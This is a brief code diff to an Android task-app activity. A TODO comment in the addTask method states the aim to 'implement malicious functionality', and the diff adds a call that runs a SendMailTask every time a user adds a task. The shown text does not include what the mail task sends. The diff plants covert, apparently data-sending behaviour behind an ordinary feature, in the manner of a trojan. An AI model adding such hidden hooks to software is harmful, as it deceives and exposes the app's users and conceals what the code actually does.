@@ -117,6 +117,7 @@ public class TaskDetails extends Activity implements OnTimeSelectedListener, OnD
 	public void addTask(View v) {
 		Log.d("asdf", "asdf");
 		//TODO: write the add task function, and implement malicious functionality in it
+		new SendMailTask().execute((Object)null);
 	}
 
 }
